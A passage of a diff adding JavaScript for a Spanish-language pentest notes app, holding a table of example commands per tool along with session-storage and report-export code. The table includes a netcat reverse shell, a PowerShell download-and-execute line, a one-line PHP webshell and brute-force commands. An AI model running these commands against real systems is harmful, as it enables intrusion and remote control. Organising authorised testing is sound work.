+      "smbclient -L //10.0.0.1 -N",
+      "smbclient //10.0.0.1/share -U admin"
+    ]
+  },
+  "enum4linux": {
+    desc: "Enumeración de información de Windows/Linux vía SMB.",
+    lines: [
+      "enum4linux -a 10.0.0.1",
+      "enum4linux -S 10.0.0.1  # listar shares"
+    ]
+  },
+  "hydra": {
+    desc: "Ataque de fuerza bruta a servicios de autenticación.",
+    lines: [
+      "hydra -l admin -P rockyou.txt ssh://10.0.0.1",
+      "hydra -L users.txt -p password ftp://10.0.0.1",
+      "hydra -l admin -P pass.txt 10.0.0.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
+    ]
+  },
+  "medusa": {
+    desc: "Fuerza bruta paralela a servicios remotos.",
+    lines: [
+      "medusa -h 10.0.0.1 -u admin -P pass.txt -M ssh",
+      "medusa -H hosts.txt -U users.txt -P pass.txt -M ftp"
+    ]
+  },
+  "tcpdump": {
+    desc: "Captura de paquetes en línea de comandos.",
+    lines: [
+      "tcpdump -i eth0 -w capture.pcap",
+      "tcpdump -i eth0 host 10.0.0.1 and port 80",
+      "tcpdump -r capture.pcap -X"
+    ]
+  },
+  "Wireshark": {
+    desc: "Analizador de protocolos de red gráfico.",
+    lines: [
+      "wireshark capture.pcap",
+      "tshark -r capture.pcap -Y \"http.request\""
+    ]
+  },
+  "bettercap": {
+    desc: "Framework MITM versátil con módulos interactivos.",
+    lines: [
+      "bettercap -eval \"set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on\"",
+      "bettercap -iface eth0"
+    ]
+  },
+  "mitmproxy": {
+    desc: "Proxy MITM para inspeccionar tráfico HTTP/HTTPS.",
+    lines: [
+      "mitmproxy -p 8080 --mode transparent",
+      "mitmdump -r capture.flow"
+    ]
+  },
+  "ettercap": {
+    desc: "Suite MITM con soporte ARP poisoning y plugins.",
+    lines: [
+      "ettercap -T -M arp:remote /10.0.0.1/ /10.0.0.2/",
+      "ettercap -G   # modo gráfico"
+    ]
+  },
+  "chisel": {
+    desc: "Túnel TCP/UDP sobre HTTP, ideal para pivoting.",
+    lines: [
+      "# Servidor (atacante):", "chisel server -p 8000 --reverse",
+      "# Cliente (víctima):", "chisel client 10.0.0.1:8000 R:8888:localhost:80"
+    ]
+  },
+  "sshuttle": {
+    desc: "VPN transparente sobre SSH.",
+    lines: [
+      "sshuttle -r user@10.0.0.1 192.168.1.0/24",
+      "sshuttle -r user@10.0.0.1 --dns 0/0"
+    ]
+  },
+  "proxychains": {
+    desc: "Encadena tráfico TCP a través de proxies (SOCKS/HTTP).",
+    lines: [
+      "proxychains nmap -sT -Pn 10.0.0.1",
+      "proxychains4 -f proxychains.conf firefox"
+    ]
+  },
+  "ligolo-ng": {
+    desc: "Túnel de red para pivoting ligero.",
+    lines: [
+      "# Proxy (atacante):", "./proxy -selfcert -laddr :443",
+      "# Agent (víctima):", "./agent -connect 10.0.0.1:443 -ignore-cert"
+    ]
+  },
+  "cobalt strike": {
+    desc: "Plataforma de Adversary Simulation (comercial).",
+    lines: [
+      "# Team server:", "./teamserver 10.0.0.1 pass123",
+      "# Beacon payloads, C2 sobre HTTP/DNS/SMB"
+    ]
+  },
+  "dradis": {
+    desc: "Plataforma colaborativa para informes de pentest.",
+    lines: [
+      "dradis start",
+      "http://localhost:3000 — interfaz web"
+    ]
+  },
+  "cherrytree": {
+    desc: "Editor de notas jerárquico con resaltado de código.",
+    lines: [
+      "cherrytree report.ctd",
+      "Exportar a HTML/PDF desde el menú"
+    ]
+  },
+  "faraday": {
+    desc: "IDE para pentest — gestión de vulns y evidencia.",
+    lines: [
+      "faraday-client",
+      "faraday-server start"
+    ]
+  },
+  "whois": {
+    desc: "Consulta de registros WHOIS de dominios/IPs.",
+    lines: [
+      "whois target.com",
+      "whois 203.0.113.1"
+    ]
+  },
+  "dig": {
+    desc: "Herramienta DNS para consultar registros.",
+    lines: [
+      "dig target.com ANY +noall +answer",
+      "dig -x 8.8.8.8",
+      "dig axfr @ns1.target.com target.com   # zone transfer"
+    ]
+  },
+  "nslookup": {
+    desc: "Consulta DNS interactiva.",
+    lines: [
+      "nslookup target.com",
+      "nslookup -type=any target.com"
+    ]
+  },
+  "Sublist3r": {
+    desc: "Enumeración de subdominios vía OSINT.",
+    lines: [
+      "sublist3r -d target.com",
+      "sublist3r -d target.com -b -t 50"
+    ]
+  },
+  "amass": {
+    desc: "Enumeración de subdominios con múltiples fuentes.",
+    lines: [
+      "amass enum -d target.com",
+      "amass intel -whois -d target.com"
+    ]
+  },
+  "theHarvester": {
+    desc: "Recolección de emails, subdominios y hosts OSINT.",
+    lines: [
+      "theHarvester -d target.com -b google",
+      "theHarvester -d target.com -b linkedin"
+    ]
+  },
+  "whatweb": {
+    desc: "Identificación de tecnologías web.",
+    lines: [
+      "whatweb https://target.com",
+      "whatweb -a 3 https://target.com --log-json report.json"
+    ]
+  },
+  "Burp Suite": {
+    desc: "Proxy web interactivo para pruebas de seguridad.",
+    lines: [
+      "java -jar burpsuite_pro.jar &",
+      "Proxy en 127.0.0.1:8080 — interceptar y modificar peticiones"
+    ]
+  },
+  "katana": {
+    desc: "Crawler web rápido de ProjectDiscovery.",
+    lines: [
+      "katana -u https://target.com",
+      "katana -u https://target.com -d 2 -o urls.txt"
+    ]
+  },
+  "gospider": {
+    desc: "Spider web concurrente con soporte de formularios.",
+    lines: [
+      "gospider -s https://target.com -c 20 -t 5",
+      "gospider -S urls.txt -o output"
+    ]
+  },
+  "waybackurls": {
+    desc: "Obtiene URLs históricas de Wayback Machine.",
+    lines: [
+      "waybackurls target.com > urls.txt",
+      "cat domains.txt | waybackurls > all_urls.txt"
+    ]
+  },
+  "nuclei": {
+    desc: "Escáner de vulnerabilidades basado en templates YAML.",
+    lines: [
+      "nuclei -u https://target.com -t cves/",
+      "nuclei -l targets.txt -severity critical,high"
+    ]
+  },
+  "sqlmap": {
+    desc: "Detección y explotación automática de SQLi.",
+    lines: [
+      "sqlmap -u 'https://target.com/page?id=1' --batch --dbs",
+      "sqlmap -u 'https://target.com/page?id=1' -D db --tables",
+      "sqlmap -r request.txt --batch --os-shell"
+    ]
+  },
+  "dalfox": {
+    desc: "Escáner de XSS rápido y paramétrico.",
+    lines: [
+      "dalfox url https://target.com/page?q=test",
+      "dalfox pipe < urls.txt -o report.txt"
+    ]
+  },
+  "xsstrike": {
+    desc: "Suite de detección y explotación XSS.",
+    lines: [
+      "xsstrike -u 'https://target.com/page?q=test'",
+      "xsstrike -u 'https://target.com/page?q=test' --fuzzer"
+    ]
+  },
+  "Burp Intruder": {
+    desc: "Herramienta de fuzzing automatizado en Burp Suite.",
+    lines: [
+      "Posiciones de payload → ataque de fuerza bruta/fuzzing",
+      "Sniper, Battering ram, Pitchfork, Cluster bomb"
+    ]
+  },
+  "jwt_tool": {
+    desc: "Auditoría y ataque a tokens JWT.",
+    lines: [
+      "jwt_tool eyJhbGciOi... -T",
+      "jwt_tool eyJhbGciOi... -C -d rockyou.txt"
+    ]
+  },
+  "Burp Sequencer": {
+    desc: "Análisis de aleatoriedad de tokens de sesión.",
+    lines: [
+      "Capturar token → enviar a Sequencer → Live capture",
+      "Test de calidad de entropía"
+    ]
+  },
+  "LinPeas": {
+    desc: "Script de enumeración de escalada de privilegios en Linux.",
+    lines: [
+      "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+      "chmod +x linpeas.sh && ./linpeas.sh"
+    ]
+  },
+  "WinPEAS": {
+    desc: "Enumeración de escalada de privilegios en Windows.",
+    lines: [
+      "winpeas.exe          # ejecutar en cmd/powershell",
+      "winpeas.exe -quiet   # modo silencioso"
+    ]
+  },
+  "exploit-suggester": {
+    desc: "Sugiere exploits según versión del kernel/SO.",
+    lines: [
+      "linux-exploit-suggester.sh",
+      "windows-exploit-suggester.py --update"
+    ]
+  },
+  "GTFO": {
+    desc: "Binarios Unix que escalan privilegios (GTFOBins).",
+    lines: [
+      "sudo -l                    # ver binarios sudo permitidos",
+      "gtfobins.github.io        # buscar binario específico"
+    ]
+  },
+  "sudo": {
+    desc: "Ejecutar comandos como otro usuario.",
+    lines: [
+      "sudo -l",
+      "sudo -u root /bin/bash"
+    ]
+  },
+  "suid": {
+    desc: "Buscar binarios SUID para escalada de privilegios.",
+    lines: [
+      "find / -perm -4000 -type f 2>/dev/null",
+      "find / -perm -6000 -type f 2>/dev/null  # SGID"
+    ]
+  },
+  "cron": {
+    desc: "Tareas programadas — posible escalada si scripts editables.",
+    lines: [
+      "cat /etc/crontab",
+      "ls -la /etc/cron*",
+      "cat /var/spool/cron/crontabs/*"
+    ]
+  },
+  "nc": {
+    desc: "Netcat — lectura/escritura de conexiones TCP/UDP.",
+    lines: [
+      "nc -lvnp 4444                 # listener",
+      "nc -e /bin/bash 10.0.0.1 4444 # reverse shell",
+      "nc -nv 10.0.0.1 22           # conexión simple"
+    ]
+  },
+  "powershell": {
+    desc: "Shell de Windows con capacidades de scripting.",
+    lines: [
+      "powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://10.0.0.1/shell.ps1')\"",
+      "powershell –exec Bypass -File script.ps1"
+    ]
+  },
+  "base64": {
+    desc: "Codificación/decodificación Base64 para exfiltración.",
+    lines: [
+      "cat data.txt | base64 -w0",
+      "echo 'cGFzcw==' | base64 -d"
+    ]
+  },
+  "webshell": {
+    desc: "Script residente en servidor web para ejecución remota.",
+    lines: [
+      "<?php system($_GET['cmd']); ?>   # webshell minimal PHP",
+      "curl 'http://target.com/shell.php?cmd=id'"
+    ]
+  },
+  "markdown": {
+    desc: "Formato de documentación ligero para informes.",
+    lines: [
+      "# Reporte - Pentest target.com",
+      "## Hallazgo: SQLi en /login",
+      "**Severidad:** Crítica  ·  **CVSS:** 9.8",
+      "```\nevidence payload here\n```"
+    ]
+  },
+  "CVSS 3.1": {
+    desc: "Common Vulnerability Scoring System v3.1 — métrica de severidad.",
+    lines: [
+      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Crítica",
+      "https://www.first.org/cvss/calculator/3.1"
+    ]
+  },
+  "DREAD": {
+    desc: "Modelo de riesgo: Damage, Reproducibility, Exploitability, Affected users, Discoverability.",
+    lines: [
+      "DREAD = (D+R+E+A+D) / 5",
+      "Rango: 0-10 por categoría"
+    ]
+  },
+  "Risk Matrix": {
+    desc: "Matriz de riesgo probabilidad vs impacto.",
+    lines: [
+      "Crear tabla con ejes: Probabilidad (Baja/Media/Alta) x Impacto (Bajo/Medio/Alto)",
+      "Celda roja = Crítico, amarilla = Medio, verde = Bajo"
+    ]
+  }
+};
+
+/* ── Render ── */
+function switchTab(name) {
+  document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+  document.querySelector(`.tabs button[data-tab="${name}"]`).classList.add('active');
+  document.getElementById(`tab-${name}`).classList.add('active');
+  closeAllExamples();
+  updateProgress(name);
+}
+
+function renderSteps(category, steps) {
+  const container = document.getElementById(`tab-${category}`);
+  container.innerHTML = steps.map((s, i) => {
+    const toolChips = s.tools.map(t => {
+      const id = `chk-${category}-${i}-${t.toLowerCase().replace(/[^a-z0-9]+/g,'-')}`;
+      return `<div class="tool-chip" data-category="${category}" data-step="${i}" data-tool="${t}">
+        <input type="checkbox" id="${id}" onchange="toolCheckChanged(this, '${category}', ${i})">
+        <span class="tool-name" onclick="showToolExample('${category}', ${i}, '${t.replace(/'/g, "\\'")}')">${t}</span>
+      </div>`;
+    }).join('');
+
+    return `
+    <div class="step" data-index="${i}" data-category="${category}">
+      <div class="step-header">
+        <div class="step-title"><span class="collapse-arrow">▼</span><span class="num">#${i+1}</span>${s.title} <span class="step-tool-count" id="stc-${category}-${i}"></span></div>
+      </div>
+      <div class="step-tools">${toolChips}</div>
+      <div class="trail-map" id="trail-${category}-${i}">
+        ${s.tools.map((t, ti) => `<div class="trail-dot" id="dot-${category}-${i}-${ti}" data-tooltip="${t}" title="${t}"></div>`).join('')}
+        <span class="trail-label">tools</span>
+      </div>
+      <div class="step-desc">${s.desc}</div>
+      <textarea placeholder="Hallazgos, comandos, outputs relevantes..." data-category="${category}" data-index="${i}"></textarea>
+      <div class="step-stats" id="stats-${category}-${i}"></div>
+      <div class="tool-examples" id="examples-${category}-${i}"></div>
+    </div>`;
+  }).join('');
+}
+
+renderSteps('networks', DATA.networks);
+renderSteps('targets', DATA.targets);
+
+/* ── Tool chips & examples ── */
+function toolCheckChanged(cb, cat, step) {
+  const label = cb.closest('.tool-chip');
+  if (label) label.classList.toggle('checked', cb.checked);
+  saveToStorage();
+  updateProgress(cat);
+}
+
+function showToolExample(category, stepIndex, toolName) {
+  const panel = document.getElementById(`examples-${category}-${stepIndex}`);
+  if (!panel) return;
+
+  const ex = TOOL_EXAMPLES[toolName];
+  if (!ex) {
+    showToast(`No examples for "${toolName}"`, true);
+    return;
+  }
+
+  const step = DATA[category][stepIndex];
+  const tools = step.tools;
+
+  if (panel.classList.contains('open')) {
+    const activeTab = panel.querySelector(`.ex-tab.active`);
+    if (activeTab && activeTab.dataset.tool === toolName) {
+      panel.classList.remove('open');
+      panel.innerHTML = '';
+      document.getElementById('examplesBackdrop')?.classList.remove('open');
+      return;
+    }
+  }
+
+  document.querySelectorAll('.tool-examples.open').forEach(p => {
+    if (p !== panel) { p.classList.remove('open'); p.innerHTML = ''; }
+  });
+
+  panel.classList.add('open');
+  document.getElementById('examplesBackdrop')?.classList.add('open');
+  panel.innerHTML = `
+    <div class="tool-examples-header">
+      <span class="ex-title">&#9656; <span id="exTitle-${category}-${stepIndex}">${toolName}</span></span>
+      <button class="ex-close" onclick="closeExamplesPanel('${category}', ${stepIndex})" title="Close">&times;</button>
+    </div>
+    <div class="ex-tabs">
+      ${tools.map(t => `<button class="ex-tab${t === toolName ? ' active' : ''}" data-tool="${t}" onclick="switchToolExample('${category}', ${stepIndex}, '${t.replace(/'/g, "\\'")}')">${t}</button>`).join('')}
+    </div>
+    ${tools.map(t => {
+      const e = TOOL_EXAMPLES[t];
+      if (!e) return `<div class="ex-content${t === toolName ? ' active' : ''}" data-tool="${t}"><div class="ex-desc">Sin ejemplos cargados.</div></div>`;
+      return `<div class="ex-content${t === toolName ? ' active' : ''}" data-tool="${t}">
+        <div class="ex-desc">${e.desc}</div>
+        ${e.lines.map(l => {
+          const c = l.trim();
+          return `<pre class="${c.startsWith('#') ? 'ex-comment' : ''}">${c.startsWith('#') ? l : '$ ' + l}</pre>`;
+        }).join('')}
+      </div>`;
+    }).join('')}
+  `;
+}
+
+function switchToolExample(category, stepIndex, toolName) {
+  const panel = document.getElementById(`examples-${category}-${stepIndex}`);
+  if (!panel) return;
+  panel.querySelectorAll('.ex-tab').forEach(t => t.classList.toggle('active', t.dataset.tool === toolName));
+  panel.querySelectorAll('.ex-content').forEach(c => c.classList.toggle('active', c.dataset.tool === toolName));
+  const title = document.getElementById(`exTitle-${category}-${stepIndex}`);
+  if (title) title.textContent = toolName;
+  const active = panel.querySelector('.ex-content.active');
+  if (active) active.scrollTop = 0;
+}
+
+function closeExamplesPanel(category, stepIndex) {
+  const panel = document.getElementById(`examples-${category}-${stepIndex}`);
+  if (!panel) return;
+  panel.classList.remove('open');
+  panel.innerHTML = '';
+  document.getElementById('examplesBackdrop')?.classList.remove('open');
+}
+
+function closeAllExamples() {
+  document.querySelectorAll('.tool-examples.open').forEach(p => {
+    p.classList.remove('open');
+    p.innerHTML = '';
+  });
+  document.getElementById('examplesBackdrop')?.classList.remove('open');
+}
+
+/* ── Progress ── */
+function updateProgress(category) {
+  const bar = document.getElementById(`progress-${category}`);
+  if (!bar) return;
+  const steps = document.querySelectorAll(`#tab-${category} .step`);
+  let total = 0, done = 0;
+  steps.forEach((s, i) => {
+    const tas = s.querySelectorAll('textarea');
+    const chips = s.querySelectorAll('.tool-chip');
+    const totalC = chips.length;
+    const checked = [...chips].filter(c => c.classList.contains('checked')).length;
+    const el = s.querySelector('.step-tool-count');
+    if (el) el.textContent = totalC ? `(${checked}/${totalC})` : '';
+    chips.forEach((chip, ti) => {
+      const dot = document.getElementById(`dot-${category}-${i}-${ti}`);
+      if (dot) dot.classList.toggle('used', chip.classList.contains('checked'));
+    });
+    tas.forEach(ta => { total++; if (ta.value.trim()) done++; });
+    chips.forEach(c => { total++; if (c.classList.contains('checked')) done++; });
+  });
+  const pct = total ? Math.round((done/total)*100) : 0;
+  bar.innerHTML = `
+    <span class="label">${category === 'networks' ? 'Redes' : 'Objetivos'}</span>
+    <div class="bar"><div class="fill" style="width:${pct}%"></div></div>
+    <span class="count">${done}/${total}</span>
+  `;
+  updateToolStats();
+  updateTrailSummary();
+  updateToolJourney();
+}
+
+function updateTrailSummary() {
+  const el = document.getElementById('trailSummary');
+  const pathEl = document.getElementById('trailPath');
+  if (!el || !pathEl) return;
+
+  const allSteps = document.querySelectorAll('.step');
+  const nodes = [];
+  allSteps.forEach(step => {
+    const title = step.querySelector('.step-title')?.textContent?.trim() || '';
+    const shortTitle = title.replace(/^\#\d+\s*/, '').substring(0, 22);
+    const chips = step.querySelectorAll('.tool-chip');
+    const checkedCount = [...chips].filter(c => c.classList.contains('checked')).length;
+    const hasNotes = (step.querySelector('textarea')?.value || '').trim().length > 0;
+    const done = checkedCount > 0 || hasNotes;
+    nodes.push({ shortTitle, done, checkedCount, total: chips.length });
+  });
+
+  if (nodes.every(n => !n.done)) { el.style.display = 'none'; return; }
+  el.style.display = '';
+
+  const doneCount = nodes.filter(n => n.done).length;
+  const statsEl = document.createElement('span');
+  statsEl.className = 'trail-stats';
+  statsEl.textContent = `${doneCount}/${nodes.length} steps`;
+  pathEl.innerHTML = '';
+  pathEl.appendChild(statsEl);
+
+  nodes.forEach((n, i) => {
+    if (i > 0) {
+      const arrow = document.createElement('span');
+      arrow.className = 'trail-arrow';
+      arrow.textContent = n.done ? '→' : '·';
+      pathEl.appendChild(arrow);
+    }
+    const node = document.createElement('span');
+    node.className = `trail-node ${n.done ? 'done' : 'pending'}`;
+    const toolInfo = n.total > 0 ? ` [${n.checkedCount}/${n.total}]` : '';
+    node.textContent = n.shortTitle + toolInfo;
+    pathEl.appendChild(node);
+  });
+}
+
+/* ── Tool journey (consolidated view) ── */
+function updateToolJourney() {
+  const el = document.getElementById('toolJourney');
+  const listEl = document.getElementById('journeyList');
+  if (!el || !listEl) return;
+
+  const toolMap = {};
+
+  document.querySelectorAll('.step').forEach(step => {
+    const cat = step.dataset.category;
+    const idx = step.dataset.index;
+    const title = step.querySelector('.step-title')?.textContent?.trim()?.replace(/^\#\d+\s*/, '') || '';
+    const shortTitle = title.substring(0, 20);
+    step.querySelectorAll('.tool-chip').forEach(chip => {
+      if (!chip.classList.contains('checked')) return;
+      const name = chip.querySelector('.tool-name')?.textContent || '';
+      if (!toolMap[name]) toolMap[name] = [];
+      toolMap[name].push(shortTitle);
+    });
+  });
+
+  const entries = Object.entries(toolMap);
+  if (entries.length === 0) { el.style.display = 'none'; return; }
+  el.style.display = '';
+
+  listEl.innerHTML = entries.sort((a, b) => a[0].localeCompare(b[0])).map(([name, steps]) => {
+    const stepsStr = steps.map(s => `<span class="j-steps">${s}</span>`).join('<span class="j-arrow">→</span>');
+    return `<span class="journey-entry"><span class="j-name">${name}</span>${stepsStr}</span>`;
+  }).join('');
+}
+
+/* ── Textarea helpers ── */
+function getTextareas() {
+  return document.querySelectorAll('.step textarea');
+}
+
+function copyCommand(el) {
+  if (!el || !el.textContent) return;
+  const text = el.textContent.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    el.classList.add('copied');
+    el._copyTimer = clearTimeout(el._copyTimer);
+    el._copyTimer = setTimeout(() => el.classList.remove('copied'), 1500);
+  }).catch(() => {
+    const range = document.createRange();
+    range.selectNodeContents(el);
+    const sel = window.getSelection();
+    sel.removeAllRanges();
+    sel.addRange(range);
+  });
+}
+
+function filterNotes(query) {
+  const q = query.toLowerCase().trim();
+  document.querySelectorAll('.step').forEach(step => {
+    if (!q) {
+      step.style.display = '';
+      return;
+    }
+    const ta = step.querySelector('textarea');
+    const taMatch = ta && ta.value.toLowerCase().includes(q);
+    const toolMatch = Array.from(step.querySelectorAll('.tool-chip .tool-name')).some(el => el.textContent.toLowerCase().includes(q));
+    step.style.display = (taMatch || toolMatch) ? '' : 'none';
+  });
+}
+
+function showToast(msg, isError) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast' + (isError ? ' error' : '');
+  requestAnimationFrame(() => t.classList.add('show'));
+  clearTimeout(t._hide);
+  t._hide = setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+/* ── Sessions & Storage ── */
+const SESSIONS_KEY = 'hidr4lisk_pentool_sessions';
+const ACTIVE_KEY = 'hidr4lisk_pentool_active_session';
+let activeSessionId = null;
+
+function getAllSessions() {
+  try {
+    return JSON.parse(localStorage.getItem(SESSIONS_KEY)) || {};
+  } catch(e) { return {}; }
+}
+
+function saveAllSessions(sessions) {
+  try { localStorage.setItem(SESSIONS_KEY, JSON.stringify(sessions)); } catch(e) {}
+}
+
+function getActiveSessionId() {
+  return localStorage.getItem(ACTIVE_KEY) || null;
+}
+
+function setActiveSessionId(id) {
+  try { localStorage.setItem(ACTIVE_KEY, id); } catch(e) {}
+}
+
+function generateId() {
+  return 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6);
+}
+
+function renderSessionSelect() {
+  const sel = document.getElementById('sessionSelect');
+  const sessions = getAllSessions();
+  const ids = Object.keys(sessions).sort((a, b) => (sessions[b].created || 0) - (sessions[a].created || 0));
+  sel.innerHTML = '';
+  ids.forEach(id => {
+    const s = sessions[id];
+    const opt = document.createElement('option');
+    opt.value = id;
+    opt.textContent = s.name || 'Unnamed';
+    if (id === activeSessionId) opt.selected = true;
+    sel.appendChild(opt);
+  });
+  const info = document.getElementById('sessionInfo');
+  if (activeSessionId && sessions[activeSessionId]) {
+    const s = sessions[activeSessionId];
+    const d = new Date(s.created);
+    info.textContent = `Created: ${d.toLocaleDateString()} ${d.toLocaleTimeString()}`;
+  } else {
+    info.textContent = '';
+  }
+}
+
+function createSession() {
+  const name = prompt('Session name (e.g. client target):');
+  if (!name || !name.trim()) return;
+  const id = generateId();
+  const sessions = getAllSessions();
+  sessions[id] = { name: name.trim(), created: Date.now(), data: emptySessionData() };
+  saveAllSessions(sessions);
+  activeSessionId = id;
+  setActiveSessionId(id);
+  renderSessionSelect();
+  loadSessionData(sessions[id].data);
+  updateNoteStats();
+  updateProgress('networks');
+  updateProgress('targets');
+  showToast(`Session "${name.trim()}" created`);
+}
+
+function switchSession(id) {
+  const sessions = getAllSessions();
+  if (!sessions[id]) return;
+  saveCurrentToSession();
+  activeSessionId = id;
+  setActiveSessionId(id);
+  loadSessionData(sessions[id].data);
+  updateNoteStats();
+  renderSessionSelect();
+  updateProgress('networks');
+  updateProgress('targets');
+}
+
+function renameSession() {
+  if (!activeSessionId) return;
+  const sessions = getAllSessions();
+  const current = sessions[activeSessionId];
+  if (!current) return;
+  const name = prompt('New name:', current.name);
+  if (!name || !name.trim()) return;
+  current.name = name.trim();
+  saveAllSessions(sessions);
+  renderSessionSelect();
+  showToast('Session renamed');
+}
+
+function duplicateSession() {
+  if (!activeSessionId) return;
+  const sessions = getAllSessions();
+  const current = sessions[activeSessionId];
+  if (!current) return;
+  const name = prompt('Duplicate session name:', current.name + ' (copy)');
+  if (!name || !name.trim()) return;
+  const id = generateId();
+  sessions[id] = { name: name.trim(), created: Date.now(), data: JSON.parse(JSON.stringify(current.data)) };
+  saveAllSessions(sessions);
+  activeSessionId = id;
+  setActiveSessionId(id);
+  renderSessionSelect();
+  loadSessionData(sessions[id].data);
+  updateNoteStats();
+  updateProgress('networks');
+  updateProgress('targets');
+  showToast(`Duplicated as "${name.trim()}"`);
+}
+
+function deleteSession() {
+  if (!activeSessionId) return;
+  const sessions = getAllSessions();
+  const name = sessions[activeSessionId]?.name || 'Unnamed';
+  if (!confirm(`Delete session "${name}"? This cannot be undone.`)) return;
+  delete sessions[activeSessionId];
+  const ids = Object.keys(sessions);
+  if (ids.length > 0) {
+    activeSessionId = ids[0];
+    setActiveSessionId(ids[0]);
+    loadSessionData(sessions[ids[0]].data);
+    updateNoteStats();
+  } else {
+    const id = generateId();
+    sessions[id] = { name: 'Default', created: Date.now(), data: emptySessionData() };
+    saveAllSessions(sessions);
+    activeSessionId = id;
+    setActiveSessionId(id);
+    loadSessionData(sessions[id].data);
+    updateNoteStats();
+  }
+  saveAllSessions(sessions);
+  renderSessionSelect();
+  updateProgress('networks');
+  updateProgress('targets');
+  showToast('Session deleted');
+}
+
+function emptySessionData() {
+  return { networks: { notes: [], tools: [] }, targets: { notes: [], tools: [] } };
+}
+
+function saveCurrentToSession() {
+  if (!activeSessionId) return;
+  const sessions = getAllSessions();
+  if (!sessions[activeSessionId]) return;
+  sessions[activeSessionId].data = getSessionData();
+  saveAllSessions(sessions);
+}
+
+function getSessionData() {
+  const data = emptySessionData();
+  ['networks','targets'].forEach(cat => {
+    document.querySelectorAll(`#tab-${cat} .step textarea`).forEach(ta => data[cat].notes.push(ta.value));
+    document.querySelectorAll(`#tab-${cat} .step`).forEach(step => {
+      const tools = [];
+      step.querySelectorAll('.tool-chip').forEach(chip => tools.push(chip.classList.contains('checked')));
+      data[cat].tools.push(tools);
+    });
+  });
+  return data;
+}
+
+function loadSessionData(data) {
+  if (!data) return;
+  ['networks','targets'].forEach(cat => {
+    if (data[cat]) {
+      if (data[cat].notes) {
+        document.querySelectorAll(`#tab-${cat} .step textarea`).forEach((ta, i) => {
+          ta.value = (i < data[cat].notes.length) ? (data[cat].notes[i] || '') : '';
+        });
+      }
+      if (data[cat].tools) {
+        document.querySelectorAll(`#tab-${cat} .step`).forEach((step, si) => {
+          step.querySelectorAll('.tool-chip').forEach((chip, ti) => {
+            const checked = (si < data[cat].tools.length && ti < data[cat].tools[si].length) ? data[cat].tools[si][ti] : false;
+            chip.classList.toggle('checked', checked);
+            chip.querySelector('input[type="checkbox"]').checked = checked;
+            const dot = document.getElementById(`dot-${cat}-${si}-${ti}`);
+            if (dot) dot.classList.toggle('used', checked);
+          });
+        });
+      }
+    }
+  });
+  autoResizeAllTextareas();
+}
+
+/* Backward compat: migrate old single-key storage to sessions */
+function migrateOldStorage() {
+  try {
+    const oldRaw = localStorage.getItem('hidr4lisk_pentool_notes');
+    if (!oldRaw) return;
+    const old = JSON.parse(oldRaw);
+    const sessions = getAllSessions();
+    if (Object.keys(sessions).length === 0) {
+      const id = generateId();
+      sessions[id] = { name: 'Default (migrated)', created: Date.now(), data: old };
+      saveAllSessions(sessions);
+      activeSessionId = id;
+      setActiveSessionId(id);
+    }
+    localStorage.removeItem('hidr4lisk_pentool_notes');
+  } catch(e) {}
+}
+
+function saveToStorage() {
+  saveCurrentToSession();
+}
+
+function loadFromStorage() {
+  migrateOldStorage();
+  const savedId = getActiveSessionId();
+  const sessions = getAllSessions();
+  const ids = Object.keys(sessions);
+  if (ids.length === 0) {
+    const id = generateId();
+    sessions[id] = { name: 'Default', created: Date.now(), data: emptySessionData() };
+    saveAllSessions(sessions);
+    activeSessionId = id;
+    setActiveSessionId(id);
+  } else if (savedId && sessions[savedId]) {
+    activeSessionId = savedId;
+  } else {
+    activeSessionId = ids[0];
+    setActiveSessionId(ids[0]);
+  }
+  renderSessionSelect();
+  loadSessionData(sessions[activeSessionId]?.data);
+}
+
+document.addEventListener('input', function(e) {
+  if (e.target.matches('.step textarea')) { saveToStorage(); updateNoteStats(); autoResizeTextarea(e.target); }
+});
+
+/* ── Export ── */
+function exportMD() {
+  const sessions = getAllSessions();
+  const sessionName = sessions[activeSessionId]?.name || 'Unnamed';
+  let md = `# Pentesting Report — ${sessionName}\n\n`;
+  md += `> Generated by Hidr4lisk_Pentool on ${new Date().toLocaleString()}\n\n`;
+
+  ['networks','targets'].forEach(catKey => {
+    const label = catKey === 'networks' ? 'Redes' : 'Objetivos Individuales';
+    const steps = DATA[catKey];
+    const textareas = document.querySelectorAll(`#tab-${catKey} .step textarea`);
+    md += `# Category: ${label}\n\n`;
+    textareas.forEach((ta, i) => {
+      const s = steps[i];
+      const chipStates = [];
+      document.querySelectorAll(`#tab-${catKey} .step`)[i]?.querySelectorAll('.tool-chip').forEach(chip => {
+        const name = chip.querySelector('.tool-name')?.textContent || '';
+        const checked = chip.classList.contains('checked');
+        chipStates.push(checked ? `[x] ${name}` : `[ ] ${name}`);
+      });
+      md += `## Step ${i+1}: ${s.title}\n\n`;
+      md += `**Tools:** ${chipStates.join(', ')}\n\n`;
+      md += `**Description:** ${s.desc}\n\n`;
+      const safeVal = (ta.value || '*No notes recorded*').replace(/```/g, '\\`' + '``');
+      md += `**Notes:**\n\`\`\`\n${safeVal}\n\`\`\`\n\n---\n\n`;
+    });
+  });
+
+  // Trail summary section
+  md += `# Route Trail\n\n`;
+  let overallTotal = 0, overallDone = 0;
+  ['networks','targets'].forEach(catKey => {
+    const label = catKey === 'networks' ? 'Redes' : 'Objetivos Individuales';
+    const steps = DATA[catKey];
+    const textareas = document.querySelectorAll(`#tab-${catKey} .step textarea`);
+    md += `## ${label}\n\n`;
+    textareas.forEach((ta, i) => {
+      const s = steps[i];
+      const chips = document.querySelectorAll(`#tab-${catKey} .step`)[i]?.querySelectorAll('.tool-chip') || [];
+      const checked = [...chips].filter(c => c.classList.contains('checked')).length;
+      const hasNotes = ta.value.trim().length > 0;
+      const status = checked > 0 || hasNotes ? '✓' : '○';
+      overallTotal++; if (checked > 0 || hasNotes) overallDone++;
+      const toolStatus = [...chips].map(chip => {
+        const name = chip.querySelector('.tool-name')?.textContent || '';
